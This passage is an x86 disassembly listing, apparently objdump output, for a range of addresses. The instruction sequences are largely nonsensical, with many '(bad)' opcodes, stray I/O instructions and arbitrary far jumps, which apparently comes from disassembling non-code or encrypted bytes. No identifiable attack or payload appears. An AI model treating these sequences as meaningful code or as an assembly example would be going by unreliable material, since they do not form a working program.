  42204e:	and    DWORD PTR [esi],ebx
  422050:	mov    bh,0x1b
  422052:	icebp  
  422053:	shl    BYTE PTR [edx-0x1a5dd4b9],0x82
  42205a:	push   ss
  42205b:	mov    dl,0x55
  42205d:	(bad)  
  42205e:	pop    ebp
  42205f:	xor    eax,DWORD PTR [edx]
  422061:	out    dx,al
  422062:	rol    DWORD PTR [edx-0xb],0x50
  422066:	jp     0x42207b
  422068:	jns    0x42205f
  42206a:	cmp    DWORD PTR [ebx+eax*2-0x74ed7788],0xef7ded26
  422075:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422076:	ret    
  422077:	mov    WORD PTR [esi+0x6b0e6412],es
  42207d:	pushf  
  42207e:	cvttps2pi mm3,QWORD PTR ds:0x24b22ad2
  422085:	sub    ebx,edi
  422087:	sahf   
  422088:	lds    esi,FWORD PTR [ecx+ebp*4]
  42208b:	fs fldlg2 
  42208e:	lock aam 0x3f
  422091:	and    eax,0xe958ad76
  422096:	mov    ebp,DWORD PTR [ebx+0x795e4fb2]
  42209c:	jae    0x422021
  42209e:	rol    DWORD PTR [ebx-0x38ffc552],cl
  4220a4:	(bad)  
  4220a5:	aad    0xa
  4220a7:	fwait
  4220a8:	nop
  4220a9:	fstp   QWORD PTR [edi+0x3c]
  4220ac:	shr    edx,cl
  4220ae:	lods   al,BYTE PTR ds:[esi]
  4220af:	jno    0x422094
  4220b1:	ss ss scas eax,DWORD PTR es:[edi]
  4220b4:	aad    0x0
	...
  422116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422117:	push   edx
  422118:	jnp    0x422117
  42211a:	(bad)  
  42211b:	std    
  42211c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42211d:	pop    ebx
  42211e:	or     ebx,ebp
  422120:	retf   0xe05c
  422123:	jno    0x422107
  422125:	push   ebx
  422126:	push   cs
  422127:	push   0x1
  422129:	add    BYTE PTR [edi],al
  42212b:	add    DWORD PTR [eax],eax
  42212d:	add    BYTE PTR [edx],bh
  42212f:	xchg   edx,eax
  422130:	fbld   TBYTE PTR [eax+0x17]
  422133:	cmp    eax,0xe65dc27f
  422138:	vmovhlps xmm3,xmm7,xmm7
  42213c:	hlt    
  42213d:	repz add DWORD PTR [esi+0x1c],eax
  422141:	je     0x422181
  422143:	xchg   esi,eax
  422144:	jmp    0x8a9b:0xf6938d85
  42214b:	lods   eax,DWORD PTR ds:[esi]
  42214c:	and    dh,BYTE PTR [ecx-0x5654b81d]
  422152:	mov    DWORD PTR [ebx+0x61],esi
  422155:	xchg   esi,eax
  422156:	push   eax
  422157:	dec    ebp
  422158:	mov    dl,0x50
  42215a:	push   ebp
  42215b:	out    dx,eax
  42215c:	test   ch,ch
  42215e:	xchg   dh,bh
  422160:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422161:	mov    bl,0x6
  422163:	push   cs
  422164:	out    0xc6,eax
  422166:	jmp    DWORD PTR [esi]
  422168:	or     eax,0xcc71d7ed
  42216d:	sti    
  42216e:	add    esi,ebp
  422170:	xor    BYTE PTR [edx-0x15cfd814],dl
  422176:	scas   eax,DWORD PTR es:[edi]
  422177:	cwde   
  422178:	xchg   esi,eax
  422179:	sbb    ah,BYTE PTR [esi+0x714bb730]
  42217f:	mov    DWORD PTR [eax+ebx*8-0x661a36a2],eax
  422186:	dec    esp
  422187:	add    esi,DWORD PTR [ebp+edi*8-0x4a870bbb]
  42218e:	mov    dl,0x3b
  422190:	jno    0x4221c3
  422192:	retf   0xe1b1
  422195:	enter  0x1cae,0x94
  422199:	lea    ebx,[ebx]
  42219b:	fild   DWORD PTR [esi-0x11657d0d]
  4221a1:	and    cl,BYTE PTR [esi-0x4f]
  4221a4:	push   ss
  4221a5:	cmp    DWORD PTR [ecx-0x64b68899],0xccbc93b5
  4221af:	xor    DWORD PTR [edx],0x4a
  4221b2:	imul   eax,DWORD PTR [edx-0x68],0x37a564a8
  4221b9:	(bad)  
  4221ba:	das    
  4221bb:	lahf   
  4221bc:	cwde   
  4221bd:	loope  0x4221ce
  4221bf:	pop    eax
  4221c0:	loopne 0x42217c
  4221c2:	sti    
  4221c3:	dec    ebx
  4221c4:	sub    BYTE PTR [ecx-0x5d],ch
  4221c7:	jbe    0x422203
  4221c9:	cmc    
  4221ca:	mov    ah,0x9e
  4221cc:	xor    eax,0x4e0f05a0
  4221d1:	jmp    0xe17e:0x8a49b707
  4221d8:	mov    bl,0xb8
  4221da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4221db:	nop
  4221dc:	adc    DWORD PTR [esi+0x4e],esi
  4221df:	cmp    DWORD PTR [eax-0x44],ebx
  4221e2:	out    0x63,eax
  4221e4:	xor    edi,DWORD PTR [esi-0x71b3503d]
  4221ea:	fild   WORD PTR [esi]
  4221ec:	xor    edi,0x5bab5a83
  4221f2:	dec    ecx
  4221f3:	inc    edx
  4221f4:	(bad)  
  4221f5:	sbb    DWORD PTR [edx],esi
  4221f7:	cmp    ecx,ecx
  4221f9:	test   DWORD PTR [bp+si],ebx
  4221fc:	sub    ebx,DWORD PTR [edi+ecx*4+0x53eb20cc]
  422203:	sbb    BYTE PTR [ecx+0x744a48f9],0x1b
  42220a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42220b:	adc    BYTE PTR [ecx],0x26
  42220e:	pop    ebx
  42220f:	inc    ecx
  422210:	rcr    DWORD PTR [esp],1
  422213:	pop    ebp
  422214:	mov    DWORD PTR [ecx-0x13],ebx
  422217:	(bad)  
  422218:	out    dx,al
  422219:	repz (bad) 
  42221b:	shr    BYTE PTR [bx+di+0x14],1
  42221f:	dec    edi
  422220:	push   ds
  422221:	mov    dl,0x6
  422223:	adc    eax,DWORD PTR [ebx]
  422225:	or     DWORD PTR [esi+0x3b457e70],esp
  42222b:	dec    eax
  42222c:	je     0x4221be
  42222e:	pop    ecx
  42222f:	mov    bh,0xbf
  422231:	neg    DWORD PTR [esi-0xa]
  422234:	test   al,0x0
	...
  422296:	(bad)  
  422297:	in     eax,dx
  422298:	lods   eax,DWORD PTR ds:[esi]
  422299:	imul   edi
  42229b:	neg    edi
  42229d:	std    
  42229e:	fsubr  DWORD PTR [edi-0x12]
  4222a1:	adc    ecx,DWORD PTR [ecx]
  4222a3:	fs cmp al,0x1b
  4222a6:	adc    eax,0x700016b
  4222ab:	add    DWORD PTR [eax],eax
  4222ad:	add    bl,dh
  4222af:	cmp    DWORD PTR fs:[eax+0x6e4126a3],ebx
  4222b6:	les    edx,FWORD PTR [esi+0x73]
  4222b9:	scas   eax,DWORD PTR es:[edi]
  4222ba:	inc    edi
  4222bb:	arpl   WORD PTR [edx-0x1d9adad4],ax
  4222c1:	neg    BYTE PTR [esi-0x85e49fe]
  4222c7:	xlat   BYTE PTR ds:[ebx]
  4222c8:	mov    bl,0xe9
  4222ca:	ficom  DWORD PTR [ecx+0x3e50e3b6]
  4222d0:	sub    ch,BYTE PTR [edi-0x2496f89]
  4222d6:	fld    QWORD PTR [ebx+0x5ee6420c]
  4222dc:	inc    ebp
  4222dd:	jbe    0x4222e3
  4222df:	or     BYTE PTR [eax],ah
  4222e1:	loope  0x422353
  4222e3:	jl     0x4222e1
  4222e5:	adc    edx,DWORD PTR [edi-0x2f7bf468]
  4222eb:	adc    ecx,DWORD PTR [eax]
  4222ed:	jge    0x4222b4
  4222ef:	push   ds
  4222f0:	mov    ecx,DWORD PTR [eax+0x4cf4dce1]
  4222f6:	xor    DWORD PTR [eiz*4-0x3cc4de65],edx
  4222fd:	jno    0x4222f0
  4222ff:	push   edx
  422300:	gs js  0x4222c8
  422303:	loope  0x4222c7
  422305:	loope  0x422378
  422307:	pushf  
  422308:	or     eax,0x10
  42230b:	rol    DWORD PTR [ebx-0x2e4cf888],1
  422311:	stos   BYTE PTR es:[di],al
  422313:	xor    al,0xb6
  422315:	dec    ecx
  422316:	int3   
  422317:	shl    DWORD PTR [edx-0x20de7f8f],1
  42231d:	lods   al,BYTE PTR ds:[esi]
  42231e:	aaa    
  42231f:	int3   
  422320:	dec    bx
  422322:	mov    esp,0xa0662309
  422327:	add    al,0x50
  422329:	and    eax,0xab9ea2cb
  42232e:	test   al,0x9f
  422330:	mov    DWORD PTR [esi+0x14bfb8d0],esp
  422336:	(bad)  
  422339:	and    DWORD PTR [ebx],ebx
  42233b:	bound  ebp,QWORD PTR [edx-0x73]
  42233e:	in     al,0x18
  422340:	sub    al,0xcf
  422342:	mov    cl,0xfd
  422344:	inc    esi
  422345:	inc    eax
  422346:	push   cs
  422347:	in     eax,dx
  422348:	mov    edi,0x574a24fe
  42234d:	jmp    0x9a5b:0xd474cabd
  422354:	(bad)  
  422355:	je     0x422380
  422357:	lock out dx,eax
  422359:	in     eax,dx
  42235a:	push   ecx
  42235b:	mov    edi,0x7152341e
  422360:	sbb    edi,esi
  422362:	ds xchg ebx,eax
  422364:	inc    ebx
  422365:	push   edx
  422366:	cmp    BYTE PTR [ebx+0x77062f35],cl
  42236c:	xchg   esp,eax
  42236d:	dec    ebx
  42236e:	cli    
  42236f:	jmp    0x42232e
  422371:	jnp    0x422305
  422373:	sub    al,0xad
  422375:	inc    edx
  422376:	pusha  
  422377:	inc    esi
  422378:	inc    esp
  422379:	ins    DWORD PTR es:[edi],dx
  42237a:	cmp    al,0x6f
  42237c:	mov    ds:0x4a6c5c1c,al
  422381:	push   0xffffffdd
  422383:	xor    al,0x9b
  422385:	loop   0x4223d3
  422387:	pop    ebx
  422388:	jo     0x422386
  42238a:	push   ss
  42238b:	xor    DWORD PTR [ebx],esi
  42238d:	pop    ds
  42238e:	mov    bh,0xe6
  422390:	inc    esi
  422391:	jle    0x759307a5
  422397:	mov    ah,0x77
  422399:	test   al,0xed
  42239b:	pop    es
  42239c:	retf   0x8b54
  42239f:	mov    ch,0x6d
  4223a1:	add    edx,DWORD PTR [eax]
  4223a3:	xor    ch,BYTE PTR [ebx-0x338f4611]
  4223a9:	mov    eax,0xc543a095
  4223ae:	lahf   
  4223af:	(bad)  
  4223b0:	sbb    ebx,DWORD PTR [ecx+0x95cea2]
	...
  422416:	push   edx
  422417:	sub    BYTE PTR [esi],0x69
  42241a:	(bad)  
  42241b:	in     eax,dx
  42241c:	push   edi
  42241d:	mov    ebx,0x65b61588
  422422:	ret    
  422423:	outs   dx,DWORD PTR cs:[esi]
  422425:	pop    ebp
  422426:	sbb    al,0x6c
  422428:	add    DWORD PTR [eax],eax
  42242a:	pop    es
  42242b:	add    DWORD PTR [eax],eax
  42242d:	add    BYTE PTR [ecx+0x2b],ah
  422430:	mov    dh,0xeb
  422432:	fimul  WORD PTR [ebx]
  422434:	cmp    al,0x37
  422436:	cmp    DWORD PTR [ebp-0x31de068a],ebx
  42243c:	push   ecx
  42243d:	or     edi,DWORD PTR [ebx+0x4938354c]
  422443:	test   ebp,0xd56b7d7
  422449:	jb     0x42240f
  42244b:	into   
  42244c:	rcr    eax,1
  42244e:	rol    DWORD PTR [ecx+ecx*4-0x43e08f6b],1
  422455:	out    dx,eax
  422456:	or     al,0x57
  422458:	es fdivp st(0),st
  42245b:	or     ebx,edi
  42245d:	dec    ebp
  42245e:	ss popf 
  422460:	jns    0x42248a
  422462:	cmc    
  422463:	mov    eax,0xa1c09e0e
  422468:	in     al,dx
  422469:	xor    eax,0xbccf6325
  42246e:	es das 
  422470:	add    esi,DWORD PTR [ecx+0x7f]
  422473:	or     DWORD PTR [edi],edx
  422475:	cmp    al,0x60
  422477:	add    eax,DWORD PTR [eax-0x26]
  42247a:	bound  edi,QWORD PTR [ebx+0x50]
  42247d:	loopne 0x422433
  42247f:	stos   DWORD PTR es:[edi],eax
  422480:	mov    ah,0x2e
  422482:	jne    0x4224aa
  422484:	adc    eax,0xe6b1a491
  422489:	add    eax,0xbd2cc150
  42248e:	in     al,dx
  42248f:	and    ah,BYTE PTR [ecx]
  422491:	jb     0x4224cf
  422493:	test   eax,0x734ef7a6
  422498:	mov    bl,0x1e
  42249a:	fwait
  42249b:	rcr    DWORD PTR [ebx-0x7e],cl
  42249e:	scas   eax,DWORD PTR es:[edi]
  42249f:	sbb    DWORD PTR [edx],ebp
  4224a1:	scas   eax,DWORD PTR es:[edi]
  4224a2:	mov    ds:0xded3ba3e,eax
  4224a7:	scas   al,BYTE PTR es:[edi]
  4224a8:	imul   DWORD PTR [ecx+0x7b9d88d4]
  4224ae:	add    eax,0xaca3b3b1
  4224b3:	dec    esp
  4224b4:	jne    0x42246b
  4224b6:	aam    0xc3
  4224b8:	and    al,0x11
  4224ba:	mov    ds:0x9c47479c,eax
  4224bf:	push   cs
  4224c0:	and    ah,bh
  4224c2:	push   cs
  4224c3:	in     eax,0x5e
  4224c5:	xor    DWORD PTR [esi-0x11b58dc3],edx
  4224cb:	and    al,0x71
  4224cd:	(bad)  
  4224ce:	mov    ?,esp
  4224d0:	and    ebp,DWORD PTR [edi+edi*4]
  4224d3:	add    bh,BYTE PTR [eax+ebx*8]
  4224d6:	xor    dh,bh
  4224d8:	lea    edi,[ebp-0x727bfdda]
  4224de:	fcmovne st,st(6)
  4224e0:	leave  
  4224e1:	push   edi
  4224e2:	jle    0x4224db
  4224e4:	push   edi
  4224e5:	(bad)  
  4224e6:	shl    BYTE PTR [esi-0x76bb2fab],cl
  4224ec:	jp     0x422472
  4224ee:	cdq    
  4224ef:	lds    ebx,FWORD PTR [eax-0xde821e1]
  4224f5:	scas   eax,DWORD PTR es:[edi]
  4224f6:	dec    edx
  4224f7:	xchg   DWORD PTR [edi-0x379bd8b2],edx
  4224fd:	dec    ecx
  4224fe:	sar    DWORD PTR [esi],1
  422500:	push   cs
  422501:	cld    
  422502:	aad    0xc7
  422504:	jmp    0x71f1:0xa991bfc
  42250b:	dec    esp
  42250c:	pushf  
  42250d:	mov    ds:0x3ed364c5,eax
  422512:	(bad)  
  422513:	xor    DWORD PTR ds:0x80c27aa8,0x63
  42251b:	int    0xcc
  42251d:	sub    DWORD PTR [esi-0x9],ebx
  422520:	xchg   edx,eax
  422521:	xor    esi,DWORD PTR [edi-0x7dc72326]
  422527:	mov    ebx,0x10045f5d
  42252c:	sbb    cl,BYTE PTR [ecx+0x52]
  42252f:	pop    es
  422530:	dec    edx
  422531:	adc    dh,BYTE PTR [ebx-0x65]
  422534:	inc    eax
	...
  422595:	add    BYTE PTR [edx-0x40887052],bl
  42259b:	ja     0x422597
  42259d:	out    dx,eax
  42259e:	and    ebx,DWORD PTR [esi]
  4225a0:	outs   dx,DWORD PTR ds:[esi]
  4225a1:	fmul   DWORD PTR [edx]
  4225a3:	sub    edx,DWORD PTR [eax]
  4225a5:	stos   BYTE PTR es:[edi],al
  4225a6:	and    ebp,DWORD PTR [ebp+0x1]
  4225a9:	add    BYTE PTR [edi],al
  4225ab:	add    DWORD PTR [eax],eax
  4225ad:	add    BYTE PTR [ebp+0x6f69946e],dl
  4225b3:	mov    bl,0x58
  4225b5:	js     0x42262b
  4225b7:	dec    edx
  4225b8:	xor    eax,0x6fc72a81
  4225bd:	clc    
  4225be:	jg     0x4225dd
  4225c0:	call   0x5523c2c1
  4225c5:	dec    ebx
  4225c6:	leave  
  4225c7:	ret    
  4225c8:	fdiv   st,st(3)
  4225ca:	jmp    0x2d6c226c
  4225cf:	cmp    dl,bh
  4225d1:	in     eax,0xcd
  4225d3:	int    0x89
  4225d5:	push   esp
  4225d6:	xor    DWORD PTR [ecx+0x4e189a79],0xffffffe2
  4225dd:	push   edx
  4225de:	mov    al,bl
  4225e0:	add    ebx,DWORD PTR [esi-0x2a71f4f0]
  4225e6:	xchg   ecx,eax
  4225e7:	mov    eax,ds:0x72805a16
  4225ec:	add    dl,ch
  4225ee:	daa    
  4225ef:	lock (bad) 
  4225f1:	rep ins BYTE PTR es:[edi],dx
  4225f3:	fidivr DWORD PTR [eax+0x18]
  4225f6:	in     al,0xb4
  4225f8:	jnp    0x4225b0
  4225fa:	mov    ebp,0x41b76ac3
  4225ff:	in     eax,0xd
  422601:	sbb    eax,0xa622d139
  422606:	arpl   bp,si
  422608:	popf   
  422609:	sbb    eax,0x68581c29
  42260e:	icebp  
  42260f:	pusha  
  422610:	ja     0x422641
  422612:	je     0x4225ae
  422614:	mov    esp,0x4b11b41c
  422619:	popf   
  42261a:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42261c:	inc    esp
  42261d:	sub    DWORD PTR [edi+0x21f0904d],ecx
  422623:	rcr    DWORD PTR [edx+eax*1+0x76],0x9d
  422628:	cmc    
  422629:	sub    DWORD PTR [esp+esi*4+0x7d],0xa1a3b8cc
  422631:	dec    edi
  422632:	mov    esi,0x5ca31e82
  422637:	aad    0xbb
  422639:	(bad)  
  42263a:	jmp    0x422626
  42263c:	call   0x681b:0xa9079341
  422643:	push   cs
  422644:	stc    
  422645:	in     al,dx
  422646:	adc    ah,BYTE PTR [edi+0x34]
  422649:	jno    0x422635
  42264b:	and    cl,al
  42264d:	sbb    ecx,ecx
  42264f:	jae    0x42260e
  422651:	xchg   BYTE PTR [edx],dl
  422653:	in     al,dx
  422654:	dec    esp
  422655:	dec    eax
  422656:	dec    esp
  422657:	repnz retf 
  422659:	loop   0x4225f9
  42265b:	inc    dh
  42265d:	clc    
  42265e:	xchg   esi,eax
  42265f:	mov    edi,0x3d5c420d
  422664:	cli    
  422665:	rol    esp,0x9f
  422668:	xlat   BYTE PTR ds:[ebx]
  422669:	push   ecx
  42266a:	push   cs
  42266b:	loopne 0x422612
  42266d:	xlat   BYTE PTR ds:[ebx]
  42266e:	gs pop eax
  422670:	xor    eax,0x74d3db05
  422675:	jle    0x4226c8
  422677:	les    edx,FWORD PTR [ecx-0x23832a5d]
  42267d:	pop    edx
  42267e:	inc    ecx
  42267f:	xchg   esi,eax
  422680:	cwde   
  422681:	call   0x34f2:0x55d5087b
  422688:	(bad)  
  42268a:	shl    BYTE PTR [eax],cl
  42268c:	mov    ds,edi
  42268e:	rol    BYTE PTR [ebp+0x2103fe35],1
  422694:	push   ds
  422695:	jmp    0x422649
  422697:	aaa    
  422698:	cmc    
  422699:	popa   
  42269a:	stos   DWORD PTR es:[edi],eax
  42269b:	fxch   st(4)
  42269d:	lds    ecx,FWORD PTR [esi]
  42269f:	cli    
  4226a0:	iret   
  4226a1:	dec    ebp
  4226a2:	or     al,0xc1
  4226a4:	pop    ebx
  4226a5:	xchg   esp,eax
  4226a6:	out    0xaa,al
  4226a8:	bound  edi,QWORD PTR [eax+0x23811012]
  4226ae:	retf   0x4824
  4226b1:	into   
  4226b2:	cmc    
  4226b3:	mov    eax,ds:0x67
	...
  422714:	add    BYTE PTR [eax],al
  422716:	daa    
  422717:	sub    eax,0x7d7f2d7d
  42271c:	ja     0x42274d
  42271e:	aad    0x21
  422720:	add    al,0x2f
  422722:	jns    0x4226c4
  422724:	or     BYTE PTR [edx+ebp*1],dl
  422727:	outs   dx,BYTE PTR ds:[esi]
  422728:	add    DWORD PTR [eax],eax
  42272a:	pop    es
  42272b:	add    DWORD PTR [eax],eax
  42272d:	add    BYTE PTR [edi+edx*4+0x4a],bl
  422731:	pusha  
  422732:	pop    DWORD PTR [esi+0x5fb027df]
  422738:	jbe    0x422798
  42273a:	aas    
  42273b:	adc    BYTE PTR [ebx+0x1f03ac50],cl
  422741:	inc    dl
  422743:	pop    edx
  422744:	adc    al,0x54
  422746:	mov    DWORD PTR [ebp-0x74],esi
  422749:	arpl   WORD PTR [ebp-0x5d],bx
  42274c:	mov    ds:0xb9a09b99,eax
  422751:	out    dx,al
  422752:	je     0x422761
  422754:	cmp    eax,0xf4dd68c6
  422759:	xchg   ecx,eax
  42275a:	cmp    DWORD PTR [edi+0x131e803],edi
  422760:	xchg   edx,eax
  422761:	stc    
  422762:	pushf  
  422763:	rcr    BYTE PTR [edx+0x2],0x90
  422767:	sbb    eax,0x9a3b2064
  42276c:	mov    bh,0x25
  42276e:	pusha  
  42276f:	mov    cl,0xf0
  422771:	mov    dh,0xdc
  422773:	mov    BYTE PTR [edi],cl
  422775:	scas   eax,DWORD PTR es:[edi]
  422776:	mov    esp,0x9c51c9e4
  42277b:	and    al,0xa8
  42277d:	add    DWORD PTR [ebx],esi
  42277f:	ds pop ss
  422781:	pop    edi
  422782:	fmul   QWORD PTR [edx+edx*2]
  422785:	cmp    ch,BYTE PTR [edx+0x6b601a72]
  42278b:	push   ds
  42278c:	jp     0x4227eb
  42278e:	xchg   ebx,eax
  42278f:	lea    eax,[edi]
  422791:	pop    edx
  422792:	int    0xeb
  422794:	dec    esi
  422795:	xchg   ebx,esi
  422797:	lahf   
  422798:	dec    ebp
  422799:	cdq    
  42279a:	loopne 0x42276f
  42279c:	xchg   edx,eax
  42279d:	pop    esp
  42279e:	pop    ss
  42279f:	mov    bl,0x31
  4227a1:	mov    al,ds:0xaae18f54
  4227a6:	adc    DWORD PTR [ecx+0x65],ebx
  4227a9:	or     al,0x45
  4227ab:	mov    edx,0x83e160b3
  4227b0:	push   esi
  4227b1:	data16 test al,0x74
  4227b4:	repz xor DWORD PTR ds:0x482d859e,esp
  4227bc:	jle    0x4227bf
  4227be:	bound  ecx,QWORD PTR [ecx-0x52926c8b]
  4227c4:	stos   DWORD PTR es:[edi],eax
  4227c5:	aaa    
  4227c6:	rcr    BYTE PTR [edi+0x2c],cl
  4227c9:	or     cl,ch
  4227cb:	push   ecx
  4227cc:	pop    ecx
  4227cd:	out    0x2a,al
  4227cf:	pushf  
  4227d0:	or     edx,esi
  4227d2:	scas   al,BYTE PTR es:[edi]
  4227d3:	mov    DWORD PTR [ebx-0x13],edx
  4227d6:	jmp    0x4227f6
  4227d8:	mov    esp,0x35c16bb3
  4227dd:	mov    ds:0x182a5f2c,eax
  4227e2:	repz inc ebp
  4227e4:	jecxz  0x422783
  4227e6:	push   ebp
  4227e7:	jecxz  0x422794
  4227e9:	xor    BYTE PTR [ecx],dl
  4227eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4227ec:	mov    esp,0x2f320f2d
  4227f1:	into   
  4227f2:	sbb    eax,0xffa85d23
  4227f7:	dec    esp
  4227f8:	sti    
  4227f9:	out    0xe5,eax
  4227fb:	xchg   edx,eax
  4227fc:	or     BYTE PTR [eax-0x65],bh
  4227ff:	pushf  
  422800:	dec    eax
  422801:	call   0xfc9d:0xc4c3f9ee
  422808:	in     al,0xed
  42280a:	or     ecx,DWORD PTR [ecx]
  42280c:	xchg   ebx,eax
  42280d:	test   al,0x6b
  42280f:	stos   DWORD PTR es:[edi],eax
  422810:	data16 xor ch,BYTE PTR [ebp+0x29]
  422814:	jmp    0x8f94770d
  422819:	push   0xffffffcc
  42281b:	pop    ebp
  42281c:	loop   0x422804
  42281e:	add    al,0xe0
  422820:	(bad)  
  422821:	popf   
  422822:	xchg   DWORD PTR cs:[ecx-0x72],eax
  422826:	pop    ss
  422827:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422828:	clc    
  422829:	cli    
  42282a:	inc    ebp
  42282b:	add    al,0x46
  42282d:	jp     0x4228a9
  42282f:	int3   
  422830:	mov    ds:0x46f98858,eax
	...
  422895:	add    ch,cl
  422897:	cmp    DWORD PTR [eax-0x10680369],edi
  42289d:	jnp    0x42284b
  42289f:	inc    ebx
  4228a0:	cmp    bl,BYTE PTR [ebx+eiz*8]
  4228a3:	fisttp QWORD PTR [edi+ebp*4]
  4228a6:	xor    DWORD PTR [edi+0x1],ebp
  4228a9:	add    BYTE PTR [edi],al
  4228ab:	add    DWORD PTR [eax],eax
  4228ad:	add    BYTE PTR [eax+edx*4+0x47],bl
  4228b1:	push   ecx
  4228b2:	mov    dh,0x44
  4228b4:	sbb    BYTE PTR [ebx-0x4caf0b03],bh
  4228ba:	mov    ds:0x99f07355,eax
  4228bf:	scas   al,BYTE PTR es:[edi]
  4228c0:	js     0x422938
  4228c2:	std    
  4228c3:	sahf   
  4228c4:	xor    esi,0x621c41f4
  4228ca:	nop
  4228cb:	push   ebx
  4228cc:	dec    esp
  4228cd:	jp     0x4228ee
  4228cf:	mov    esp,0xf12c5268
  4228d4:	and    al,0xff
  4228d6:	retf   
  4228d7:	fs repz jmp 0x4228ed
  4228db:	rcr    DWORD PTR [ecx],1
  4228dd:	mov    ecx,0x89f5f786
  4228e2:	mov    edi,0x5257674a
  4228e7:	(bad)  
  4228e8:	mov    ds:0xfaae4ad6,al
  4228ed:	adc    BYTE PTR [ecx+0x54],0xd5
  4228f1:	sbb    al,0x4d
  4228f3:	mov    ch,BYTE PTR [ebx-0x38be03d]
  4228f9:	pop    ss
  4228fa:	add    DWORD PTR [esi-0x3e],eax
  4228fd:	stc    
  4228fe:	adc    BYTE PTR [eax-0x3a],0xec
  422902:	mov    ?,WORD PTR [ebp+0xf]
  422905:	mov    esi,DWORD PTR [ecx+0x4d]
  422908:	pop    esp
  422909:	pop    es
  42290a:	aas    
  42290b:	(bad)  
  42290c:	cmc    
  42290d:	fld    TBYTE PTR [ecx-0xb]
  422910:	jmp    0x4228d8
  422912:	push   es
  422913:	lea    ebx,[edi-0x2b82b797]
  422919:	cwde   
  42291a:	scas   al,BYTE PTR es:[edi]
  42291b:	lahf   
  42291c:	adc    BYTE PTR [ebp+0x10a9402a],dh
  422922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422923:	rol    BYTE PTR [di+0x37],1
  422927:	mov    ch,dl
  422929:	popa   
  42292a:	mov    WORD PTR [edi-0x50],gs
  42292d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42292e:	xor    DWORD PTR [ecx+0x6],ebp
  422931:	sub    BYTE PTR [edi-0x43],bh
  422934:	dec    edx
  422935:	jmp    0x6cf5:0xb8cfabc0
  42293c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42293d:	je     0x4228d2
  42293f:	push   0x1844a3ac
  422944:	sar    ebp,cl
  422946:	and    DWORD PTR [ebx+0x63ad876d],ebx
  42294c:	mov    BYTE PTR [edx-0x5594ae45],ch
  422952:	ds sbb eax,0x8863c1d7
  422958:	arpl   WORD PTR [esi+0x2a],di
  42295b:	rol    BYTE PTR [esi],0x18
  42295e:	popf   
  42295f:	pop    ss
  422960:	push   edx
  422961:	psrlw  mm4,QWORD PTR [esp+ebx*4-0x12b5700]
  422969:	adc    eax,0x3033c473
  42296e:	xchg   edx,eax
  42296f:	push   ecx
  422970:	into   
  422971:	test   eax,0x7c3aa34
  422976:	pushf  
  422977:	lods   eax,DWORD PTR ds:[esi]
  422978:	ins    BYTE PTR es:[edi],dx
  422979:	(bad)  
  42297a:	dec    edi
  42297b:	test   DWORD PTR [edx+0x77],esp
  42297e:	xchg   ebx,eax
  42297f:	pop    eax
  422980:	out    0x93,al
  422982:	(bad)  
  422983:	jne    0x4229cd
  422985:	test   cl,cl
  422987:	(bad)  
  422988:	and    BYTE PTR [esi+0x6daa0d14],bl
  42298e:	ins    BYTE PTR es:[edi],dx
  42298f:	pop    ss
  422990:	rcl    BYTE PTR [ecx+edx*2],0x86
  422994:	dec    edx
  422995:	enter  0xc77d,0xe9
  422999:	sbb    BYTE PTR [edx],dh
  42299b:	(bad)  
  42299c:	outs   dx,DWORD PTR ds:[esi]
  42299d:	push   ds
  42299e:	mov    dl,BYTE PTR [edi-0x27]
  4229a1:	push   ecx
  4229a2:	pop    es
  4229a3:	dec    esp
  4229a4:	add    BYTE PTR [esi],cl
  4229a6:	xchg   ebx,eax
  4229a7:	daa    
  4229a8:	icebp  
  4229a9:	imul   edi,DWORD PTR [ebp+0x6e5f6783],0x49f89a05
  4229b3:	adc    BYTE PTR [ebp+0x0],0x0
	...
  422a16:	xchg   esi,eax
  422a17:	push   0x18
  422a19:	mov    ah,bh
  422a1b:	cli    
  422a1c:	xchg   esi,eax
  422a1d:	jle    0x422a63
  422a1f:	rol    ecx,1
  422a21:	call   0x8ce208b3
  422a26:	cmp    BYTE PTR [eax+0x1],dh
  422a29:	add    BYTE PTR [edi],al
  422a2b:	add    DWORD PTR [eax],eax
  422a2d:	add    bl,al
  422a2f:	push   0x34034da
  422a34:	retf   
  422a35:	retf   
  422a36:	add    edi,DWORD PTR [edi+eax*1+0x69a4e39]
  422a3d:	scas   al,BYTE PTR es:[edi]
  422a3e:	retf   
  422a3f:	push   eax
  422a40:	push   ds
  422a41:	dec    ebx
  422a42:	scas   al,BYTE PTR es:[edi]
  422a43:	mov    DWORD PTR [esi+edx*8+0x41],esi
  422a47:	fwait
  422a48:	jle    0x422a7a
  422a4a:	leave  
  422a4b:	push   0x708a76bf
  422a50:	or     ch,bh
  422a52:	dec    DWORD PTR [ebx-0x2c080e5]
  422a58:	mov    ah,0xf4
  422a5a:	jmp    0x422a63
  422a5c:	dec    esi
  422a5d:	push   0x2d
  422a5f:	mov    esp,0x34e8563
  422a64:	(bad)  
  422a65:	clc    
  422a66:	inc    edx
  422a67:	pop    esi
  422a68:	and    eax,0x61d1b3ed
  422a6d:	jg     0x422aa9
  422a6f:	inc    ebx
  422a70:	inc    ecx
  422a71:	data16 arpl WORD PTR [ecx+0x18f54e2],bp
  422a78:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a79:	sub    ch,BYTE PTR [ecx]
  422a7b:	das    
  422a7c:	sbb    BYTE PTR [eax],dl
  422a7e:	jne    0x422aaa
  422a80:	out    dx,al
  422a81:	mov    edi,0xd5d1caaa
  422a86:	gs out dx,eax
  422a88:	xor    al,0x59
  422a8a:	mov    BYTE PTR [edi+0x5e4830bc],ah
  422a90:	(bad)  
  422a92:	pop    esi
  422a93:	fwait
  422a94:	mov    gs,WORD PTR [esi+0x5ca625be]
  422a9a:	xchg   DWORD PTR [esi],esi
  422a9c:	ror    BYTE PTR [ebx],cl
  422a9e:	sub    al,0xa8
